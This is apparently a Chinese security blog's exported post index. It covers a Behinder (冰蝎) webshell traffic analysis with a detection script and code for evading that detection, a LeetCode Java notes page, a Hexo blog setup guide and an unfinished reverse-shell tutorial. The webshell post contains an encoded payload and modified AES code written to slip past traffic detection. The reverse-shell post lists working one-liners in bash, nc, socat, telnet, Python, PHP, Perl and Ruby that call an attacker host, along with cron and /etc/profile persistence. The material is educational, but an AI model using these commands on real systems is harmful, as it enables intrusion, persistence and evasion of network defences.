2OFRYS1RhSmRTYVgyNmcyalhZNjBjb0RZalJ3QkpPWVlkb01DUzVoRGY3SWdZSkNNMUxLenlXZEtQSUtDaUpoTnQ5S2FXNlFnR0pNZUxxUVJ3R0FnNDQ3cmc1M2c0a1ptSW5oNDBTbGFpQnB3a3p5MWVnb0JvVXhZa2FOZnVJTGFvNXhZb2FYOHRZTjhBNHlxTjlJRWszY0tuVVNqTjRST0RMUHh0ZGlHRnNWSWxabkpQVFVjUnVyclRWbGV3SE05UXVydU14d1hXdjdHT205cjdISG9sOUsxbUExNDh4bGMzZU5IeVl3VmJRVHFoeUlWZGQ5b0JMeTlqOXZ0UkFnV250TE5tWmtZRUxvbXdHV0xUN2k5MnJGZ2VLZERPd1M1ZUtsVg==\";\n$content=base64_decode($content);\nmain($content);\n\n在这一次内容传输结束之后，冰蝎确认被攻击端与本地可以建立传输，才会发第二次包，也就是执行 phpinfo() 命令，代码略。\n接着\n\n4、服务端对 Payload 执行结果进行加密，然后返回给本地客户端；\n5、客户端收到响应密文后，利用解密算法解密，得到响应内容明文。\n\n响应内容略，在上文中已经提到过。\n由上述流程可知，一个完整的传输协议由两部分组成，本地协议和远程协议。由于客户端使用 Java 开发，因此本地协议的加解密算法需要用 Java 实现。远程协议根据服务端语言类型，可能为 Java、PHP、C#、ASP。无论用哪种语言，同一个名称的传输协议，本地和远程的加解密逻辑应该是一致的，这样才能实现本地加密后，远程可以成功解密，远程加密后，本地同样也可以解密。\n如下是一个最简单的 php 版本的传输协议：\n\n\n传输协议的加解密函数名称分别为 Encrypt 和 Decrypt，且都只有一个入参，参数类型为二进制字节流。这也就是为什么在 shell.php 中存在一个 Decrypt() 函数，且每一次的发包中有 encrypt() 函数的原因。如此一来就实现了这一个条件 ———— 本地有一对加解密的函数，由 Java 编写；远程端（受攻击端）存在一对加解密的函数，由对应远程端的语言决定，如果是 php 就是由 php 编写，若是 asp 就由 asp 编写（亲测如此）\n针对冰蝎 xor_base64 的检测脚本编写内容是基于 LiRiu 师傅的文章写的\n\n我认为的脚本编写，不应该是针对某个 User-Agent 或者是 Payload 开头等进行单一的判断，为了很多正常请求的通过，这些判断一定是需要综合考虑的。\n\n因此合理的方式应该是记分的，判断恶意性的大小。我们先来看冰蝎在第二次连接的时候，也就是请求 phpinfo() 时的包\n针对一些 HTTP 头的检测\n\nHTTP 请求头\n它的几个 Accept 头通常是固定的，所以这里可以作为一个主判断点\nAccept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01\nAccept-Encoding: identity\nAccept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7\n\n有的师傅说冰蝎 4.0 当中的 UA 是十选一的，我觉得这里占比相当小，并不需要将 UA 加入进判断规则当中。\nContent-Length 较大\nContent-Length: 8244\n\n可以作为辅助特征进行检测。\n冰蝎通讯默认使用长连接\n造成的影响是包中存在如下 HTTP 头，可以作为辅助特征进行检测。\nConnection: Keep-Alive\n\n端口检测\n冰蝎与 webshell 建立连接的同时，javaw 也与目的主机建立 tcp 连接，每次连接使用本地端口在 49700 左右，每连接一次，每建立一次新的连接，端口就依次增加。此处可以对符合该范围内的端口告警。\n针对恶意脚本内容的检测冰蝎 shell 当中的恶意 php 脚本，头都是一样的，以 @error_reporting 开头\n@error_reporting(0);  \nfunction main\n\n\n\n所以对于这一段，个人认为是可以作为主要检测规则的，所以此处需要先写一个 xor_base64，单纯检测恶意脚本的 python 程序如下\nfrom base64 import b64decode\n\nphrases = [\n    \"assert|eval(base64_decode('\".encode(),\n    b'&lt;?\\n@error_reporting(0);\\n\\nfunctio',\n    b'&lt;?\\nfunction main($action, $remot',\n    b'&lt;?\\n@error_reporting(0);\\nset_time',\n    b'\\nerror_reporting(0);\\n\\nfunction m',\n    b'&lt;?\\n@error_reporting(0);\\n\\n\\nfuncti',\n    b'&lt;?\\nerror_reporting(0);\\nfunction ',\n    b'@error_reporting(0);\\nfunction ma',\n    b'&lt;?php\\n\\n$taskResult = array();\\n$p',\n    b\"&lt;?\\nerror_reporting(0);\\nheader('C\",\n    b'@error_reporting(0);\\n\\nfunction g',\n    b'&lt;?\\n@error_reporting(0);\\n@set_tim',\n]\n\ndef xor(l0, l1):\n    ret = [chr(ord(chr(a)) ^ ord(chr(b))) for a,b in zip(l0,l1)]\n    return \"\".join(ret)\n        \n\ndef check(cipher):\n    cipher = b64decode(cipher)\n    for phrase in phrases:\n        p0 = phrase[0:16]\n        p1 = phrase[16:]\n        \n        c0 = cipher[0:16]\n        c1 = cipher[16:16+len(p1)]\n\n        k0 = xor(p0, c0)\n        k1 = xor(p1, c1)\n\n        if k1 in k0:\n            return k0\n    return None\n\ncipher = \"...\"\nHeaderData = \"...\"\n\nkey = check(cipher)\nif key:\n    print(\"[+]\", cipher[:32], \"is XOR Behinder Request!\")\n    print(\"[+] The Key of Behinder is \", key)\nelse:\n    print(\"[-]\", cipher[:32], \"not Behinder Request..\")\n\n接着加上辅助判断\ndef auxiliaryPoints(HeaderData):  \n    # 辅助判断的函数\n    evilPoint = 0\n    list = []\n    LightBlacklist = [\n        b'Accept: application/json, text/javascript, */*; q=0.01',\n        b'Accept-Encoding: identity',\n        b'Connection: Keep-Alive',\n    ]\n\n    for temp in HeaderData:\n        list.append(temp)\n    lenData = 0\n    while lenData &lt;= HeaderData.length():\n        if(list[lenData].contains(LightBlacklist)):\n            evilPoint = evilPoint + 10\n    return evilPoint\n\n\n\nLiRiu 师傅的可以，但是我自己的包失败了。。\n冰蝎马的改写与绕过 tips冰蝎作者提出了一种非常巧妙的绕过方式，也就是在 AES 加密的时候增加一个小尾巴，这个尾巴存在自定义的可能性，也就让很多设备难以进行检测了。\n加密算法本地默认的 aes 传输协议加密算法如下：\nprivate byte[] Encrypt(byte[] data) throws Exception\n&#123;\n    String key=\"e45e329feb5d925b\";\n    byte[] raw = key.getBytes(\"utf-8\");\n    javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(raw, \"AES\");\n    javax.crypto.Cipher cipher =javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");// \"算法/模式/补码方式\"\n    cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);\n    byte[] encrypted = cipher.doFinal(data);\n    Class baseCls;\n    try\n    &#123;\n        baseCls=Class.forName(\"java.util.Base64\");\n        Object Encoder=baseCls.getMethod(\"getEncoder\", null).invoke(baseCls, null);\n        encrypted= (byte[]) Encoder.getClass().getMethod(\"encode\", new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;encrypted&#125;);\n    &#125;\n    catch (Throwable error)\n    &#123;\n        baseCls=Class.forName(\"sun.misc.BASE64Encoder\");\n        Object Encoder=baseCls.newInstance();\n        String result=(String) Encoder.getClass().getMethod(\"encode\",new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;encrypted&#125;);\n        result=result.replace(\"\\n\", \"\").replace(\"\\r\", \"\");\n        encrypted=result.getBytes();\n    &#125;\n    return encrypted;\n&#125;\n\n服务端是 PHP，使用默认的 aes 算法，但是由于默认使用的是 aes128 的算法，会导致密文长度恒是 16 的整数倍，流量设备可能通过这个特征来对冰蝎做流量识别，我现在想对默认算法做一个简单修改，在密文最后最加一个 magic 尾巴，随机产生一个随机长度的额外字节数组\n修改后本地：\nprivate byte[] Encrypt(byte[] data) throws Exception\n&#123;\n    String key=\"e45e329feb5d925b\";\n    byte[] raw = key.getBytes(\"utf-8\");\n    javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(raw, \"AES\");\n    javax.crypto.Cipher cipher =javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");// \"算法/模式/补码方式\"\n    cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);\n    byte[] encrypted = cipher.doFinal(data);\n    Class baseCls;\n    try\n    &#123;\n        baseCls=Class.forName(\"java.util.Base64\");\n        Object Encoder=baseCls.getMethod(\"getEncoder\", null).invoke(baseCls, null);\n        encrypted= (byte[]) Encoder.getClass().getMethod(\"encode\", new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;encrypted&#125;);\n    &#125;\n    catch (Throwable error)\n    &#123;\n        baseCls=Class.forName(\"sun.misc.BASE64Encoder\");\n        Object Encoder=baseCls.newInstance();\n        String result=(String) Encoder.getClass().getMethod(\"encode\",new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;encrypted&#125;);\n        result=result.replace(\"\\n\", \"\").replace(\"\\r\", \"\");\n        encrypted=result.getBytes();\n    &#125;\n    //增加魔法尾巴\n    int magicNum=Integer.parseInt(key.substring(0,2),16)%16;\n    java.util.Random random=new java.util.Random();\n    byte[] buf=new byte[magicNum];\n    for (int i=0;i&lt;buf.length;i++)\n    &#123;\n        buf[i]=(byte)random.nextInt(256);\n    &#125;\n    java.io.ByteArrayOutputStream output = new java.io.ByteArrayOutputStream();\n    output.write(encrypted);\n    output.write(buf);\n    return output.toByteArray();\n&#125;\n\n远程\n由于我们目前假设的是一个 PHP 的目标环境，远程加密函数采用 PHP 格式编写，如下：\nfunction Encrypt($data)  \n&#123;  \n\t$key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond  \n\t$encrypted=base64_encode(openssl_encrypt($data, \"AES-128-ECB\", $key,OPENSSL_PKCS1_PADDING));  \n\t$magicNum=hexdec(substr($key,0,2))%16; //根据密钥动态确定魔法尾巴的长度  \n\tfor($i=0;$i&lt;$magicNum;$i++) &#123;  \n\t\t$encrypted=$encrypted.chr(mt_rand(0, 255)); //拼接魔法尾巴  \n\t&#125;  \n\treturn $encrypted;  \n&#125;\n\n解密算法在加密算法中，我们在原版 aes 的基础上，在密文最后追加了一段魔法尾巴，尾巴长度为秘钥的前两位十六进制对应的数值对 16 取模的值。在解密时，我们只需要在原版 aes 解密函数的基础上，把密文最后的尾巴截掉即可。分别对 Java 版本和 PHP 版本的解密函数做修改。\n本地\nprivate byte[] Decrypt(byte[] data) throws Exception\n&#123;\n    String k=\"e45e329feb5d925b\";\n    int magicNum=Integer.parseInt(k.substring(0,2),16)%16; //取magic tail长度\n    data=java.util.Arrays.copyOfRange(data,0,data.length-magicNum); //截掉magic tail\n    javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),\"AES\"));\n    byte[] decodebs;\n    Class baseCls ;\n            try&#123;\n                baseCls=Class.forName(\"java.util.Base64\");\n                Object Decoder=baseCls.getMethod(\"getDecoder\", null).invoke(baseCls, null);\n                decodebs=(byte[]) Decoder.getClass().getMethod(\"decode\", new Class[]&#123;byte[].class&#125;).invoke(Decoder, new Object[]&#123;data&#125;);\n            &#125;\n            catch (Throwable e)\n            &#123;\n                baseCls = Class.forName(\"sun.misc.BASE64Decoder\");\n                Object Decoder=baseCls.newInstance();\n                decodebs=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\",new Class[]&#123;String.class&#125;).invoke(Decoder, new Object[]&#123;new String(data)&#125;);\n\n            &#125;\n    return c.doFinal(decodebs);\n&#125;\n\n远程\nfunction Decrypt($data)  \n&#123;  \n\t$key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond  \n\t$magicNum=hexdec(substr($key,0,2))%16; //取magic tail长度  \n\t$data=substr($data,0,strlen($data)-$magicNum); //截掉magic tail  \n\treturn openssl_decrypt(base64_decode($data), \"AES-128-ECB\", $key,OPENSSL_PKCS1_PADDING);  \n&#125;\n\n从理论上来说，这一种方式也可以绕过 xor_base64 的检测\n0x05 小结对于冰蝎 4.0 版本的分析大部分还是由自己独立完成，在还没有看作者写的内容的时候就意识到了传输协议的本质，冰蝎 4.0 写的确实非常厉害。\n而在作者的文章当中也提供了很有启发性的思维 ———— 尽量以算法的方式改写冰蝎的攻击\n0x06 Referencehttps://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7Ahttps://liriu.life/PHP-5ba36eb0362743ed8fa5588c97325f7e\n","categories":["工具开发&编写"],"tags":["工具开发&编写"]},{"title":"刷力扣过程中的算法遗漏点","url":"/2022/09/28/%E5%88%B7%E5%8A%9B%E6%89%A3%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E7%AE%97%E6%B3%95%E9%81%97%E6%BC%8F%E7%82%B9/","content":"刷力扣过程中的算法遗漏点\n\n刷力扣过程中的算法遗漏点前言本来是可以写在一起的，但是为了封装，还是分开来，这篇文章里面主要写一堆基础的东西，以及自己想要记录的东西\n关于基础语法链表链表（Linked list）是一种常见的基础数据结构，是一种线性表，但是并不会按线性的顺序存储数据，而是在每一个节点里存到下一个节点的地址。\n链表可分为单向链表和双向链表。\n一个单向链表包含两个值: 当前节点的值和一个指向下一个节点的链接。\n\n\n一个双向链表有三个整数值: 数值、向后的节点链接、向前的节点链接。\n\n\nJava LinkedList（链表） 类似于 ArrayList，是一种常用的数据容器。\n与 ArrayList 相比，LinkedList 的增加和删除的操作效率更高，而查找和修改的操作效率较低。\nindexOf() 方法indexOf() 方法有以下四种形式：\n\npublic int indexOf(int ch): 返回指定字符在字符串中第一次出现处的索引，如果此字符串中没有这样的字符，则返回 -1。\n\npublic int indexOf(int ch, int fromIndex): 返回从 fromIndex 位置开始查找指定字符在字符串中第一次出现处的索引，如果此字符串中没有这样的字符，则返回 -1。\n\nint indexOf(String str): 返回指定字符在字符串中第一次出现处的索引，如果此字符串中没有这样的字符，则返回 -1。\n\nint indexOf(String str, int fromIndex): 返回从 fromIndex 位置开始查找指定字符在字符串中第一次出现处的索引，如果此字符串中没有这样的字符，则返回 -1。\n\n\n语法\n\npublic int indexOf(int ch )\n\t\n或\n\npublic int indexOf(int ch, int fromIndex) \n\t\n或 \n\nint indexOf(String str) \n\t\n或 \n\nint indexOf(String str, int fromIndex)\n\n\n\nch – 字符，Unicode 编码。\n\nfromIndex – 开始搜索的索引位置，第一个字符是 0 ，第二个是 1 ，以此类推。\n\nstr – 要搜索的子字符串。\n\n\ncharAt() 方法charAt() 方法用于返回指定索引处的字符。索引范围为从 0 到 length() - 1。\n语法\npublic char charAt(int index)\n\n\n参数\n\nindex – 字符的索引。\n\n返回值\n返回指定索引处的字符。\niterator 迭代器简单来说就是少写了一个 for 循环，能够直接获取到 List 数组中的元素，代码示例\nimport java.util.ArrayList;  \nimport java.util.Iterator;  \n  \npublic class RunoobTest &#123;  \n    public static void main(String[] args) &#123;  \n  \n        // 创建集合  \n        ArrayList&lt;String> sites = new ArrayList&lt;String>();  \n        sites.add(\"Google\");  \n        sites.add(\"Runoob\");  \n        sites.add(\"Taobao\");  \n        sites.add(\"Zhihu\");  \n  \n        // 获取迭代器  \n        Iterator&lt;String> it = sites.iterator();  \n  \n        // 输出集合中的所有元素  \n        while(it.hasNext()) &#123;  \n            System.out.println(it.next());  \n        &#125;  \n    &#125;  \n&#125;\n\ntoCharArray 方法用法：\nString s = \"ababa\";\nchar[] charArray = s.toCharArray();\n\n用来将字符串转换为数组，从而能够进行一些很简便的数据处理。\n关于算法","categories":["算法"],"tags":["算法"]},{"title":"利用hexo与GitHub.io搭建个人博客","url":"/2021/06/30/%E5%88%A9%E7%94%A8hexo%E4%B8%8EGitHub.io%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","content":"利用hexo与GitHub.io搭建个人博客\n\n\n前言博客有第三方平台，也可以自建，比较早的有博客园、CSDN，近几年新兴的也比较多诸如：WordPress、segmentFault、简书、掘金、知乎专栏、Github Page 等等。\n这次我要说的就是 Github Page + Hexo 搭建个人博客的方式！Github Page 是 Github 提供的一种免费的静态网页托管服务，支持Jekyll、Hugo、Hexo编译静态资源，至于Jekyll、Hugo、Hexo这些东西小伙伴们就先不用太搞懂原理，会用就行了\n废话不多说，直接进入主题\n准备环境准备node和git环境首先，安装 NodeJS，因为 Hexo 是基于 Node.js 驱动的一款博客框架，相比起前面提到过的 Jekyll 框架更快更简洁，因为天*朝网络被墙的原因尝试过安装 Jekyll 失败而放弃了。\n这边贴上 NodeJS 的下载地址\nhttps:&#x2F;&#x2F;nodejs.org&#x2F;en&#x2F;\n\n\n\n\n其次，准备git环境，一个分布式版本控制系统，用于项目的版本控制管理，作者是 Linux 之父。如果 Git 还不熟悉可以参考廖雪峰大神的 Git 教程。\n\n验证安装成功\n\ngit version\t\t\t// 验证git\nnode -v              \nnpm -v               // 验证nodejs\n\n\n\n\n如图所示，安装成功。\n\n安装Hexo如果以上环境准备好了就可以使用 npm 开始安装 Hexo 了。也可查看 Hexo 的详细文档。\n在命令行输入执行以下命令：\nnpm install -g hexo-cli\n\n安装 Hexo 完成后，再执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。\nhexo init myBlog\ncd myBlog\nnpm install\n\n好了，如果上面的命令都没报错的话，就恭喜了，运行 hexo s 命令，其中 s 是 server 的缩写，在浏览器中输入 http://localhost:4000 回车就可以预览效果了。\n\n\n打开localhost:4000会看到最开始的hexo样式，也算是成功起步啦！\n\n至此，你本地的博客就已经搭建成功啦，接下来技术部署到GitHub Pages了。也就是传说中的GitHub.io。\n\n\n在GitHub.io中创建仓库在GitHub.io中创建一个仓库，仓库名必须是用户名+github.io才可以，如图所示。\n\n\n\n\n然后打开仓库创建一个 index.html 文件，并随意先写点内容，比如 Hello World\n\n\n\n\n这个时候打开 http:&#x2F;&#x2F;你的用户名.github.io 就可以看到你的站点啦，是不是很简单！index.html 内容只是暂时的预览效果，后面把 Hexo 的文件部署上去就可以在 http:&#x2F;&#x2F;你的用户名.github.io 看到你自己的博客啦！ 比如我的就是 http://WithD-raw.github.io 了。\n部署GitHub Pages与Hexo同步要使用 git 工具首先要配置一下SSH key，为部署本地博客到 Github 做准备。\ngit config --global user.name \"用户名\"\ngit config --global user.email \"邮箱地址\"\n\n然后开始生成 SSH key\nssh-keygen -t rsa -C '上面的邮箱'\n\n按照提示进行三次回车，即可生成 SSH key。通过查看~&#x2F;.ssh&#x2F;id_rsa.pub 文件内容，获取到你的 SSH key。\n\n\n那么，获取了SSH key之后，我们要为自己的GitHub账户添加SSH key\n\n\n创建一个新的 SSH key, 标题随便，key 就填刚才生成那个，确认创建，搞定！！这样在你的 SSH keys 列表里就会看到你刚刚添加的密钥。\n\n\n\n 再在命令行下输入命令\n\nssh -T git@github.com\n\n首次使用还需要确认并添加主机到本机SSH可信列表。若返回 Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access. 内容，则证明添加成功。\n部署到GitHub此时，本地和Github的工作做得差不了，是时候把它们两个连接起来了。你也可以查看官网的部署教程。先不着急，部署之前还需要修改配置和安装部署插件。\n\n这里先解释两个小概念，在Hexo中有两个_config.yml,一个是项目根目录下的_config.yml,称为源目录配置，另外一个是在themes目录下的_config.yml,称为主题目录配置。\n\n第一：打开项目根目录下的 _config.yml 配置文件配置参数。拉到文件末尾，填上如下配置（也可同时部署到多个仓库，后面再说）\nGitHub那一栏，也是填的自己的用户名。\n\n\n第二：要安装一个部署插件 hexo-deployer-git。\nnpm install hexo-deployer-git --save\n\n最后执行以下命令就可以部署上传啦，以下 g 是 generate 缩写，d 是 deploy 缩写：\nhexo g -d              // 分开写也可以\n\nhexo g\nhexo d                 // 分开写的方式\n\n后续第二章将会带来Hexo主题的搭建以及其他一些配置的东西~\n","categories":["环境搭建"],"tags":["环境搭建"]},{"title":"反弹shell学习","url":"/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/","content":"反弹shell学习\n\n反弹 shell 学习大部分内容摘自 https://xz.aliyun.com/t/9488\n0x01 前言反弹 shell，就是攻击机监听在某个 TCP&#x2F;UDP 端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。\n0x02 机器的两种连接方式正向连接假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、Web 服务、ssh、telnet 等等都是正向连接。\n反向连接当正向连接无法接入的时候我们需要反向连接，都有这些情况。\n\n比如在渗透过程中，发现 22 端口是存在的，当时因为防火墙的存在，目标机器只能与加白的机器连接。\n目标机端口被占用。\n目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。\n…. 还有一些其他的未知情况\n\n那么反向连接就很好理解了，就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。\n反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果具有 python 环境，那我们可以利用 python 反弹 shell。如果具有 php 环境，那我们可以利用 php 反弹 shell。\n0x03 反弹 shell 姿势总结\n我这里的是两台 Linux 机器\n\n1. 使用 netcat 反弹 shell\n一般 Linux 发行版当中都会自带 netcat，若功能不全可下载二进制的版本，进行编译即可。\n\n攻击机开启本地监听：\nnetcat -lvvp 2333\n\n目标机主动连接攻击机：\nnetcat 89.xxx.xxx.72 2333 -e /bin/bash\n# nc &lt;攻击机IP> &lt;攻击机监听的端口> -e /bin/bash\n\n有时候没有 bash，要用 sh\nnc IP 2333 -e /bin/sh\n\n\n弹 shell 效果如下\n\n\n2. 利用 Bash 反弹 shell反弹 shell 最好用的方法就是使用 bash 结合重定向方法的一句话，具体命令如下：\nbash -i >&amp; /dev/tcp/47.xxx.xxx.72/2333 0>&amp;1\n或\nbash -c \"bash -i >&amp; /dev/tcp/47.xxx.xxx.72/2333 0>&amp;1\"\n# bash -i >&amp; /dev/tcp/攻击机IP/攻击机端口 0>&amp;1\n\n\nbash -i : 产生一个 bash 交互环境。\n&gt;&amp; : 将联合符号前面的内容与后面相结合，然后一起重定向给后者。\n/dev/tcp/47.xxx.xxx.72/2333 : 让目标主机与攻击机 47.xxx.xxx.72 的 2333 端口建立一个 tcp 连接\n0&gt;&amp;1 : 将标准输入与标准输出的内容相结合然后重定向给前面标准输出的内容。\n\nBash 反弹一句完整的解读过程就是：\nBash 产生了一个交互环境和本地主机主动发起与攻击机 2333 端口建立的连接（即 TCP 2333 会话连接）相结合，然后在重定向个 TCP 2333 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。\n\n实操\n\n攻击机开启本地监听：\nnc -lvvp 2333\n\n目标机主动连接攻击机：\nbash -i >&amp; /dev/tcp/47.xxx.xxx.72/2333 0>&amp;1\n\n成功！\n\n\nCurl 配合 Bash 反弹 Shell这里操作也很简单，借助了 Linux 中的管道。\n首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：\nbash -i >&amp; /dev/tcp/47.xxx.xxx.72/2333 0>&amp;1\n\n并开启 2333 端口的监听。\n然后再目标机上执行如下，即可反弹 shell：\ncurl 47.xxx.xxx.72|bash\n\n这里我没试成功，用另外师傅成功的图片\n\n\nCurl 配合 Bash 反弹 shell 的方式在 CTF 题目中经常出现，curl IP|bash 中的 IP 可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。\n将反弹shell的命令写入定时任务我们可以在目标主机的定时任务文件中写入一个反弹 shell 的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 /var/spool/cron/[crontabs]/&lt;username&gt; 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。\n比如，当前用户名为 root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos系列主机)\n比如，当前用户名为 root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian&#x2F;Ubuntu系列主机)\n将反弹 shell 的命令写入 &#x2F;etc&#x2F;profile 文件将以下反弹 shell 的命写入 &#x2F;etc&#x2F;profile 文件中，&#x2F;etc&#x2F;profile 中的内容会在用户打开 bash 窗口时执行。\n/bin/bash -i >&amp; /dev/tcp/47.xxx.xxx.72/2333 0>&amp;1 &amp;\n# 最后面那个&amp;为的是防止管理员无法输入命令\n\n当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的 shell：\n\n个人觉得这里很像后门\n\n\n\n3. 使用 socat 反弹 shellSocat 是 Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参见这里：http://brieflyx.me/2015/linux-tools/socat-introduction/\n弹 shell 的手法和 netcat 一样\n攻击机开启本地监听：\nsocat TCP-LISTEN:2333 -\n或\nnc -lvvp 2333\n\n目标机主动连接攻击机：\nsocat tcp-connect:47.xxx.xxx.72:2333 exec:'bash -li',pty,stderr,setsid,sigint,sane\n\n\n\n4. 利用 Telnet 弹 shell当 nc 和 &#x2F;dev&#x2F;tcp 不可用，且目标主机和攻击机上支持 Telnet 服务时，我们可以使用Telnet反弹shell。\n方法一攻击机开启本地监听：\nnc -lvvp 2333\n\n目标机主动连接攻击机：\nmknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1>a\n\n\n\n方法二攻击机需要开启两个本地监听：\nnc -lvvp 2333\nnc -lvvp 4000\n\n目标机主动连接攻击机：\ntelnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000\n\n5. 各种脚本反弹 shellPython 脚本弹 shell当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。\n攻击机开启本地监听：\nnc -lvvp 2333\n\n目标机主动连接攻击机：\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"47.xxx.xxx.72\",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n\n\nphp 脚本弹 shell当目标主机上有php环境时，我们可以用php来反弹shell。\n攻击机开启本地监听：\nnc -lvvp 2333\n\n目标机主动连接攻击机：\nphp -r '$sock=fsockopen(\"47.xxx.xxx.72\",2333);exec(\"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3\");'\n\nPerl 脚本反弹shell当目标主机上有perl环境时，我们可以用perl来反弹shell。\n攻击机开启本地监听：\nnc -lvvp 2333\n\n目标机主动连接攻击机：\nperl -e 'use Socket;$i=\"47.101.57.72\";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\">&amp;S\");open(STDOUT,\">&amp;S\");open(STDERR,\">&amp;S\");exec(\"/bin/sh -i\");&#125;;'\n\nRuby脚本反弹shell当目标主机上有ruby环境时，我们可以用ruby来反弹shell。\n攻击机开启本地监听：\nnc -lvvp 2333\n\n\n目标机主动连接攻击机：\nruby -rsocket -e 'c=TCPSocket.new(\"47.xxx.xxx.72\",\"2333\");while(cmd=c.gets);IO.popen(cmd,\"r\")&#123;|io|c.print io.read&#125;end'\n或\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"47.xxx.xxx.72\",\"2333\");while(cmd=c.gets);IO.popen(cmd,\"r\")&#123;|io|c.print io.read&#125;end'\n\n6. 使用Metasploit生成反弹shell用的一句话强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 msfvenom -l 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。\n我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd&#x2F;unix&#x2F;reverse），列出我们需要生成的各类反弹shell一句话的payload：\nmsfvenom -l payloads | grep 'cmd/unix/reverse'\n\n如上图所示，metasploit支持生成反弹shell一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：\nmsfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw\n\n将生成的python反弹shell的一句话在目标主机上执行即可：\n\n\n0x04 反弹shell后获取模拟终端其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。\n\n获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。\n标准的错误输出无法显示，无法正常使用vim等文本编辑器等。\n获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。\n\n这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。\n我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。\n我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：\npython -c \"import pty;pty.spawn('/bin/bash')\"\n\n0x05 使用OpenSSL反弹加密shell在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是所有的流量都是明文传输的。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。\nOpenSSL 简介在计算机网络上，OpenSSL 